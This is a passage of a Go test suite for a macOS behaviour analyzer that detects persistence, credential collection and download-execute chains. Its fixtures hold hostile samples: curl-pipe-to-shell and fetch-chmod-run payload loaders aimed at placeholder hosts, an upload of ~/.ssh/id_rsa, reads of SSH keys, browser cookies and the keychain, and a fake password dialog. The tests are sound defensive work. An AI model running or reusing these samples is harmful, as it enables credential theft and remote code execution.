	path := filepath.Join(root, "Notes.m")
	body := strings.Join([]string{
		`void logMessage() {`,
		`    NSLog(@"documentation says: osascript display dialog with hidden answer");`,
		`}`,
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoOperation(t, rep, "credential.prompt", "user-password", "")
	if hasCapability(rep, "macos.credential-prompt") {
		t.Fatalf("prose literal should not produce credential-prompt capability: %#v", rep.Capabilities)
	}
}

func TestInspectShellClipboardCommandCreatesCapability(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "clipboard.sh")
	if err := os.WriteFile(path, []byte("pbpaste\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.clipboard-read")
}

func TestInspectNativeServiceManagementResources(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "LoginItem.swift")
	body := strings.Join([]string{
		`func install() {`,
		`    try SMAppService.loginItem(identifier: "com.example.helper").register()`,
		`    try SMAppService.agentService(plistName: "com.example.agent.plist").register()`,
		`    try SMAppService.daemonService(plistName: "com.example.daemon.plist").register()`,
		`}`,
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertResource(t, rep, "macos.login-item", "login-item", "com.example.helper")
	assertResource(t, rep, "macos.launch-persistence", "launch-agent", "com.example.agent.plist")
	assertResource(t, rep, "macos.launch-persistence", "launch-daemon", "com.example.daemon.plist")
}

func TestInspectNativeServiceManagementUnregisterIsNotPersistence(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "Uninstall.swift")
	body := `try SMAppService.loginItem(identifier: "com.example.helper").unregister()`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.login-item") || hasCapability(rep, "macos.launch-persistence") {
		t.Fatalf("ServiceManagement unregister should not become persistence creation: %#v", rep.Capabilities)
	}
}

func TestInspectLanguageSensitiveFileReads(t *testing.T) {
	tests := []struct {
		name     string
		file     string
		body     string
		category string
		concrete string
	}{
		{
			name:     "python-open-read",
			file:     "read.py",
			body:     `print(open("~/.ssh/id_ed25519").read())`,
			category: "ssh-private-key",
			concrete: "~/.ssh/id_ed25519",
		},
		{
			name:     "javascript-read-file",
			file:     "read.js",
			body:     "const fs = require(\"fs\");\nfs.readFileSync(\"~/Library/Application Support/Google/Chrome/Default/Cookies\");\n",
			category: "browser.cookies",
			concrete: "~/Library/Application Support/Google/Chrome/Default/Cookies",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			path := filepath.Join(root, tt.file)
			if err := os.WriteFile(path, []byte(tt.body), 0o600); err != nil {
				t.Fatal(err)
			}
			rep, err := InspectPath(path, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			switch tt.category {
			case "browser.cookies":
				assertCapability(t, rep, "macos.browser-credential-collection")
				assertResource(t, rep, "macos.browser-credential-collection", tt.category, tt.concrete)
			default:
				assertCapability(t, rep, "macos.credential-material-collection")
				assertResource(t, rep, "macos.credential-material-collection", tt.category, tt.concrete)
			}
		})
	}
}

func TestInspectInlineShellLaunchAgentCopyPersistence(t *testing.T) {
	rep, err := inspectInlineShellForTest("cp com.example.agent.plist ~/Library/LaunchAgents/com.example.agent.plist", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertCapabilityConnectivity(t, rep, "macos.launch-persistence", "CONNECTED")
	assertResource(t, rep, "macos.launch-persistence", "launch-agent", "")
	for _, operation := range rep.Operations {
		if operation.Kind == behavior.OperationLaunchdJobInstall && operation.Qualifiers["destination_operand"] == "~/Library/LaunchAgents/com.example.agent.plist" {
			return
		}
	}
	t.Fatalf("launchd copy destination operand was not retained: %#v", rep.Operations)
}

func TestInspectInlineShellLaunchDaemonRedirectionPersistence(t *testing.T) {
	rep, err := inspectInlineShellForTest("cat payload.plist > /Library/LaunchDaemons/com.example.agent.plist", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertResource(t, rep, "macos.launch-persistence", "launch-daemon", "/Library/LaunchDaemons/com.example.agent.plist")
}

func TestInspectInlineShellLaunchAgentMentionIsNotPersistence(t *testing.T) {
	rep, err := inspectInlineShellForTest("echo ~/Library/LaunchAgents/com.example.agent.plist", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.launch-persistence") {
		t.Fatalf("plain launch agent path mention should not be persistence: %#v", rep.Capabilities)
	}
}

func TestInspectInlineShellLaunchctlPersistenceCommands(t *testing.T) {
	tests := []struct {
		command  string
		category string
		target   string
	}{
		{"launchctl load -w ~/Library/LaunchAgents/com.example.agent.plist", "launch-agent", "~/Library/LaunchAgents/com.example.agent.plist"},
		{"launchctl bootstrap system /Library/LaunchDaemons/com.example.agent.plist", "launch-daemon", "/Library/LaunchDaemons/com.example.agent.plist"},
		{"launchctl enable gui/501/com.example.agent", "launch-agent", "gui/501/com.example.agent"},
	}
	for _, tt := range tests {
		rep, err := inspectInlineShellForTest(tt.command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		assertCapability(t, rep, "macos.launch-persistence")
		assertResource(t, rep, "macos.launch-persistence", tt.category, tt.target)
	}
}

func TestInspectInlineShellLaunchctlInspectionIsNotPersistence(t *testing.T) {
	for _, command := range []string{
		"launchctl print system",
		"launchctl list",
		"launchctl kickstart -k gui/501/com.example.agent",
	} {
		rep, err := inspectInlineShellForTest(command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		if hasCapability(rep, "macos.launch-persistence") {
			t.Fatalf("%q should not be launch persistence: %#v", command, rep.Capabilities)
		}
	}
}

func TestInspectInlineShellXattrQuarantineRemoval(t *testing.T) {
	for _, command := range []string{
		"xattr -d com.apple.quarantine /Applications/App.app",
		"xattr -dr com.apple.quarantine /Applications/App.app",
		"xattr -rd com.apple.quarantine /Applications/App.app",
		"xattr --delete=com.apple.quarantine /Applications/App.app",
		"xattr -c /Applications/App.app",
		"xattr -cr /Applications/App.app",
	} {
		rep, err := inspectInlineShellForTest(command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		assertCapability(t, rep, "macos.remove-quarantine")
	}
}

func TestInspectInlineShellXattrQuarantineReadOrWriteIsNotRemoval(t *testing.T) {
	for _, command := range []string{
		"xattr -p com.apple.quarantine /Applications/App.app",
		"xattr -l /Applications/App.app",
		"xattr -w com.apple.quarantine value /Applications/App.app",
		"xattr -d com.apple.FinderInfo /Applications/App.app",
	} {
		rep, err := inspectInlineShellForTest(command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		if hasCapability(rep, "macos.remove-quarantine") {
			t.Fatalf("%q should not remove quarantine: %#v", command, rep.Capabilities)
		}
	}
}

func TestInspectInlineShellShellProfileRedirectionPersistence(t *testing.T) {
	rep, err := inspectInlineShellForTest("echo export PATH=/tmp/bin:$PATH >> ~/.zshrc", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.shell-profile-persistence")
	assertCapabilityConnectivity(t, rep, "macos.shell-profile-persistence", "CONNECTED")
	assertResource(t, rep, "macos.shell-profile-persistence", "shell-profile", "~/.zshrc")
}

func TestInspectInlineShellShellProfileCopyRemainsModeledWithoutPersistence(t *testing.T) {
	rep, err := inspectInlineShellForTest("cp profile.txt ~/.zprofile", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.shell-profile-persistence") {
		t.Fatalf("ambiguous cp destination became shell-profile persistence: %#v", rep.Capabilities)
	}
	for _, operation := range rep.Operations {
		if operation.Kind == behavior.OperationShellProfileModify && operation.Qualifiers["destination_operand"] == "~/.zprofile" {
			return
		}
	}
	t.Fatalf("shell-profile copy destination operand was not retained: %#v", rep.Operations)
}

func TestInspectInlineShellShellProfileMentionIsNotPersistence(t *testing.T) {
	rep, err := inspectInlineShellForTest("echo ~/.zshrc", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.shell-profile-persistence") {
		t.Fatalf("plain shell profile mention should not be persistence: %#v", rep.Capabilities)
	}
}

func TestInspectAppleScriptPromptAndValidationRemainIndependent(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "prompt.applescript")
	body := `display dialog "Password:" default answer "" with hidden answer
do shell script "dscl . authonly $USER secret"
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-prompt")
	assertCapability(t, rep, "macos.credential-validation")
	if len(rep.Capabilities) != 2 {
		t.Fatalf("AppleScript prompt and validation should produce independent primitives: %#v", rep.Capabilities)
	}
	assertOperation(t, rep, "credential.prompt", "user-password", "")
	assertOperation(t, rep, "credential.validate", "user-password", "")
}

func TestInspectInlineShellOSAScriptShellCommand(t *testing.T) {
	rep, err := inspectInlineShellForTest(`osascript -e 'do shell script "curl https://osascript.example/p | sh"'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertNetworkDestination(t, rep, "https://osascript.example/p")
}

func TestInspectInlineShellOSAScriptPromptAndValidationRemainIndependent(t *testing.T) {
	rep, err := inspectInlineShellForTest(`osascript -e 'display dialog "Password:" default answer "" with hidden answer' -e 'do shell script "dscl . authonly $USER secret"'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-prompt")
	assertCapability(t, rep, "macos.credential-validation")
	if len(rep.Capabilities) != 2 {
		t.Fatalf("inline AppleScript prompt and validation should produce independent primitives: %#v", rep.Capabilities)
	}
	assertOperation(t, rep, "credential.prompt", "user-password", "")
	assertOperation(t, rep, "credential.validate", "user-password", "")
}

func TestInspectInlineShellOSAScriptDashedAuthOnlyRemainsIndependent(t *testing.T) {
	rep, err := inspectInlineShellForTest(`osascript -e 'display dialog "Password:" default answer "" with hidden answer' -e 'do shell script "/usr/bin/dscl /Local/Default -authonly $USER secret"'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-prompt")
	assertCapability(t, rep, "macos.credential-validation")
	if len(rep.Capabilities) != 2 {
		t.Fatalf("dashed authonly validation should remain independent from the prompt: %#v", rep.Capabilities)
	}
	assertOperation(t, rep, "credential.prompt", "user-password", "")
	assertOperation(t, rep, "credential.validate", "user-password", "")
}

func TestInspectInlineShellOpenURLDelegatesNetwork(t *testing.T) {
	tests := []struct {
		command string
		dest    string
	}{
		{`open https://browser.example/login`, "https://browser.example/login"},
		{`open -a Safari https://safari.example/login`, "https://safari.example/login"},
	}
	for _, tt := range tests {
		rep, err := inspectInlineShellForTest(tt.command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		assertDelegatedNetworkDestination(t, rep, "open", tt.dest)
		assertOperationQualifier(t, rep, "delegated", "true")
	}
}

func TestInspectInlineShellOpenFileDoesNotBecomeNetwork(t *testing.T) {
	rep, err := inspectInlineShellForTest(`open /Applications/Calculator.app`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.NetworkImplementations) != 0 {
		t.Fatalf("file open should not become network behavior: %#v", rep.NetworkImplementations)
	}
	assertNoOperation(t, rep, "process.execute", "application", "/Applications/Calculator.app")
}

func TestInspectInlineShellUploadWithoutDestinationDoesNotPanic(t *testing.T) {
	rep, err := inspectInlineShellForTest(`curl --upload-file ~/.ssh/id_rsa`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.upload", "network-destination", "")
	assertOperation(t, rep, "network.upload", "file", "~/.ssh/id_rsa")
}

func TestInspectInlineShellOSAScriptOpenLocationDelegatesNetwork(t *testing.T) {
	rep, err := inspectInlineShellForTest(`osascript -e 'open location "https://osascript-open.example"'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertDelegatedNetworkDestination(t, rep, "AppleScript open location", "https://osascript-open.example")
	assertOperationQualifier(t, rep, "delegated", "true")
}

func TestInspectInlineShellOSAScriptMentionIsNotExecuted(t *testing.T) {
	rep, err := inspectInlineShellForTest(`echo osascript -e 'do shell script "curl https://not-executed.example/p | sh"'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("plain osascript mention should not be executable behavior: %#v", rep.Capabilities)
	}
	assertNoNetworkDestination(t, rep, "https://not-executed.example/p")
}

func TestInspectInlineShellNodeEvalSplitDownloadExecuteChain(t *testing.T) {
	rep, err := inspectInlineShellForTest(`node -e 'const child_process=require("child_process"); const url="https://node-eval.example/payload"; const target="/tmp/node-eval-payload"; const response=await fetch(url); fs.writeFileSync(target, Buffer.from(await response.arrayBuffer())); fs.chmodSync(target, 0o755); child_process.execFileSync(target)'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "/tmp/node-eval-payload")
	assertOperation(t, rep, "file.make-executable", "file", "/tmp/node-eval-payload")
	assertOperation(t, rep, "process.execute", "file", "/tmp/node-eval-payload")
	assertCapability(t, rep, "macos.download-execute")
	assertCapabilityConnectivity(t, rep, "macos.download-execute", "CONNECTED")
	assertDownloadExecuteRelationPath(t, rep, true)
	assertNetworkDestination(t, rep, "https://node-eval.example/payload")
}

func TestInspectInlineShellPythonCommandSplitDownloadExecuteChain(t *testing.T) {
	rep, err := inspectInlineShellForTest(`python -c 'import requests, subprocess; url="https://python-c.example/payload"; target="/tmp/python-c-payload"; response=requests.get(url); open(target, "wb").write(response.content); subprocess.run(["/tmp/python-c-payload"])'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "/tmp/python-c-payload")
	assertOperation(t, rep, "process.execute", "file", "/tmp/python-c-payload")
	assertCapability(t, rep, "macos.download-execute")
	assertCapabilityConnectivity(t, rep, "macos.download-execute", "CONNECTED")
	assertDownloadExecuteRelationPath(t, rep, false)
	assertNetworkDestination(t, rep, "https://python-c.example/payload")
}

func TestInspectInlineShellPythonCommandEmbeddedShellDownloadPipe(t *testing.T) {
	rep, err := inspectInlineShellForTest(`python -c 'import os; os.system("curl https://python-system.example/p | sh")'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertCapabilityConnectivity(t, rep, "macos.download-pipe-interpreter", "CONNECTED")
	assertNetworkDestination(t, rep, "https://python-system.example/p")
}

func TestInspectInlineShellNodeEvalEmbeddedShellDownloadPipe(t *testing.T) {
	rep, err := inspectInlineShellForTest(`node -e 'const cp=require("child_process"); cp.exec("curl https://node-exec.example/p | sh")'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertCapabilityConnectivity(t, rep, "macos.download-pipe-interpreter", "CONNECTED")
	assertNetworkDestination(t, rep, "https://node-exec.example/p")
}

func TestInspectPythonEnvDefaultDestination(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "agent.py")
	body := "import os\nimport requests\nendpoint = os.getenv(\"UPLOAD_URL\", \"https://uploads.example/api\")\nrequests.post(endpoint, data=b\"payload\")\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.upload", "network-destination", "https://uploads.example/api")
	assertNetworkDestination(t, rep, "https://uploads.example/api")
	for _, evidence := range rep.Evidence {
		if strings.Contains(evidence.Value, "os.getenv( =") {
			t.Fatalf("corrupted evidence value: %#v", rep.Evidence)
		}
	}
}

func TestInspectJXASensitiveResourcesWithCollectionCorroborator(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "collector.js")
	body := `const app = Application.currentApplication();
app.includeStandardAdditions = true;
const targets = ["~/Library/Keychains/login.keychain-db", "~/Library/Application Support/Exodus"];
app.doShellScript("cp " + targets[0] + " /tmp/out");
app.doShellScript("cd /tmp && zip -r /tmp/out.zip out");
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.keychain-access") || hasCapability(rep, "macos.credential-material-collection") {
		t.Fatalf("sensitive definitions and unrelated shell operations must remain independent: %#v", rep.Capabilities)
	}
	assertFeature(t, rep, "script.sensitive_resource", "~/Library/Keychains/login.keychain-db")
	assertFeature(t, rep, "script.sensitive_resource", "~/Library/Application Support/Exodus")
}

func TestInspectJXABrowserCredentialDefinitionsWithCollectionCorroborator(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "browser.js")
	body := `const app = Application.currentApplication();
app.includeStandardAdditions = true;
const browser = {
  profilesPath: "~/Library/Application Support/Google/Chrome/",
  extractFiles: ["Cookies", "Login Data"]
};
app.doShellScript("cd /tmp && zip -r /tmp/out.zip out");
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.browser-credential-collection") {
		t.Fatalf("browser definitions and an unrelated archive command must remain features: %#v", rep.Capabilities)
	}
	assertFeature(t, rep, "script.browser_credential_store", "browser credential-store definition")
}

func TestInspectSensitiveScriptResourceWithoutCollectionStaysFeature(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "notes.js")
	body := `const path = "~/Library/Application Support/Exodus";`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.credential-material-collection") {
		t.Fatalf("uncorroborated script resource should not become capabilityMatch: %#v", rep.Capabilities)
	}
	assertFeature(t, rep, "script.sensitive_resource", "~/Library/Application Support/Exodus")
}

func TestInspectPythonBodylessPostRemainsConnect(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "client.py")
	body := "import requests\nrequests.post('https://bodyless-post.example/api')\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.connect", "network-destination", "https://bodyless-post.example/api")
	assertNoOperation(t, rep, "network.upload", "network-destination", "https://bodyless-post.example/api")
	assertNetworkDestination(t, rep, "https://bodyless-post.example/api")
}

func TestInspectPythonMultilineNetworkCallResolvesDestination(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "client.py")
	body := strings.Join([]string{
		"import requests",
		`GITHUB_SEARCH_API = "https://api.github.com/search/commits"`,
		`response = requests.get(`,
		`    GITHUB_SEARCH_API,`,
		`    headers={"User-Agent": "fixture"},`,
		`    timeout=30,`,
		`)`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.connect", "network-destination", "https://api.github.com/search/commits")
	assertNetworkDestination(t, rep, "https://api.github.com/search/commits")
}

func TestInspectPythonMultilineDynamicNetworkCallStaysUnresolved(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "client.py")
	body := strings.Join([]string{
		"import requests",
		`def fetch(url):`,
		`    return requests.get(`,
		`        url,`,
		`        timeout=30,`,
		`    )`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoNetworkDestination(t, rep, "url")
	for _, operation := range rep.Operations {
		if operation.Kind == "network.connect" && operation.RequiredResource().Value != "" {
			t.Fatalf("dynamic multiline URL should remain unresolved: %#v", rep.Operations)
		}
	}
}

func TestInspectPythonURLopenGetRemainsConnect(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "client.py")
	body := "import urllib.request\nurllib.request.urlopen('https://urllib-get.example/api')\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.connect", "network-destination", "https://urllib-get.example/api")
	assertNoOperation(t, rep, "network.upload", "network-destination", "https://urllib-get.example/api")
	assertNetworkDestination(t, rep, "https://urllib-get.example/api")
}

func TestInspectPythonURLopenWithDataIsUpload(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "client.py")
	body := "import urllib.request\nurllib.request.urlopen('https://urllib-upload.example/api', data=b'payload')\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.upload", "network-destination", "https://urllib-upload.example/api")
	assertNetworkDestination(t, rep, "https://urllib-upload.example/api")
}

func TestInspectPythonURLretrieveIsDownload(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "client.py")
	body := `import urllib.request
urllib.request.urlretrieve("https://urlretrieve.example/payload", "/tmp/urlretrieve-payload")
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "/tmp/urlretrieve-payload")
	assertNetworkDestination(t, rep, "https://urlretrieve.example/payload")
}

func TestInspectJavaScriptUploadDirection(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "install.js")
	body := `fetch("https://js-upload.example/api", {method: "POST", body: payload})`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.upload", "network-destination", "https://js-upload.example/api")
	assertNetworkDestination(t, rep, "https://js-upload.example/api")
}

func TestInspectJavaScriptGetRemainsConnect(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "client.js")
	body := `fetch("https://js-get.example/api")`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.connect", "network-destination", "https://js-get.example/api")
	assertNoOperation(t, rep, "network.upload", "network-destination", "https://js-get.example/api")
	assertNetworkDestination(t, rep, "https://js-get.example/api")
}

func TestInspectPythonDownloadExecuteChain(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "install.py")
	body := strings.Join([]string{
		"import requests, subprocess",
		`url = "https://py-download.example/payload"`,
		`target = "/tmp/py-payload"`,
		`open(target, "wb").write(requests.get(url).content)`,
		`subprocess.run(["chmod", "+x", "/tmp/py-payload"])`,
		`subprocess.run(["/tmp/py-payload"])`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "/tmp/py-payload")
	assertOperation(t, rep, "file.make-executable", "file", "/tmp/py-payload")
	assertOperation(t, rep, "process.execute", "file", "/tmp/py-payload")
	assertCapability(t, rep, "macos.download-execute")
	assertDownloadExecuteRelationPath(t, rep, true)
	assertNetworkDestination(t, rep, "https://py-download.example/payload")
}

func TestInspectPythonSplitRequestWriteKeepsDynamicInterpreterTargetUnresolved(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "loader.py")
	body := strings.Join([]string{
		"import os, requests, subprocess, sys",
		`home = os.path.expanduser("~")`,
		`pd = os.path.join(home, ".n2")`,
		`ap = pd + "/pay"`,
		`aa = requests.get("https://split-python.example/payload", allow_redirects=True)`,
		`with open(ap, "wb") as f:f.write(aa.content)`,
		`subprocess.Popen([sys.executable, ap])`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "~/.n2/pay")
	assertNoOperation(t, rep, "interpreter.invoke", "file", "~/.n2/pay")
	assertOperation(t, rep, "process.execute", "file", "")
	if hasCapability(rep, "macos.download-execute") {
		t.Fatalf("derived Python argv target should not create a download/execute capability: %#v", rep.Capabilities)
	}
	assertNetworkDestination(t, rep, "https://split-python.example/payload")
}

func TestInspectPythonSplitRequestWriteRequiresMatchingContentVariable(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "loader.py")
	body := strings.Join([]string{
		"import requests",
		`target = "/tmp/payload"`,
		`aa = requests.get("https://split-negative.example/payload")`,
		`with open(target, "wb") as f:f.write(other.content)`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoOperation(t, rep, "network.download", "file", "/tmp/payload")
	if hasCapability(rep, "macos.download-execute") {
		t.Fatalf("unmatched request content variable should not create a download/execute capabilityMatch: %#v", rep.Capabilities)
	}
}

func TestInspectPythonDirectFunctionCallPromotesConnectivityWithoutInventingCrossScopeDataflow(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "loader.py")
	body := strings.Join([]string{
		"import requests, subprocess, sys",
		`target = "/tmp/function-payload"`,
		`def download_payload():`,
		`    response = requests.get("https://function-call.example/payload")`,
		`    with open(target, "wb") as f:f.write(response.content)`,
		`download_payload()`,
		`subprocess.Popen(["python", "/tmp/function-payload"])`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertFeature(t, rep, "script.function_call", "download_payload")
	assertCallRelation(t, rep, "download_payload")
	assertOperation(t, rep, "network.download", "file", "/tmp/function-payload")
	assertOperation(t, rep, "interpreter.invoke", "file", "/tmp/function-payload")
	if hasCapability(rep, "macos.download-execute") {
		t.Fatalf("function-definition line order is not call-site resource flow: %#v", rep.Capabilities)
	}
	assertNetworkDestination(t, rep, "https://function-call.example/payload")
}

func TestInspectPythonUncalledFunctionDoesNotPromoteDownloadExecuteChain(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "loader.py")
	body := strings.Join([]string{
		"import requests, subprocess, sys",
		`target = "/tmp/uncalled-payload"`,
		`def download_payload():`,
		`    response = requests.get("https://uncalled-function.example/payload")`,
		`    with open(target, "wb") as f:f.write(response.content)`,
		`subprocess.Popen(["python", "/tmp/uncalled-payload"])`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-execute") {
		t.Fatalf("uncalled function should not create a download/execute capabilityMatch: %#v", rep.Capabilities)
	}
}

func TestInspectPythonNativeChmodDownloadExecuteChain(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "install.py")
	body := strings.Join([]string{
		"import os, requests, subprocess",
		`url = "https://py-chmod.example/payload"`,
		`target = "/tmp/py-chmod-payload"`,
		`open(target, "wb").write(requests.get(url).content)`,
		`os.chmod(target, 0o755)`,
		`subprocess.run(["/tmp/py-chmod-payload"])`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "/tmp/py-chmod-payload")
	assertOperation(t, rep, "file.make-executable", "file", "/tmp/py-chmod-payload")
	assertOperation(t, rep, "process.execute", "file", "/tmp/py-chmod-payload")
	assertCapability(t, rep, "macos.download-execute")
	assertDownloadExecuteRelationPath(t, rep, true)
	assertNetworkDestination(t, rep, "https://py-chmod.example/payload")
}

func TestInspectPythonNativeChmodNonExecutableMode(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "install.py")
	body := strings.Join([]string{
		"import os, requests, subprocess",
		`url = "https://py-noexec.example/payload"`,
		`target = "/tmp/py-noexec-payload"`,
		`open(target, "wb").write(requests.get(url).content)`,
		`os.chmod(target, 0o600)`,
		`subprocess.run(["/tmp/py-noexec-payload"])`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "/tmp/py-noexec-payload")
	assertNoOperation(t, rep, "file.make-executable", "file", "/tmp/py-noexec-payload")
	assertOperation(t, rep, "process.execute", "file", "/tmp/py-noexec-payload")
	assertCapability(t, rep, "macos.download-execute")
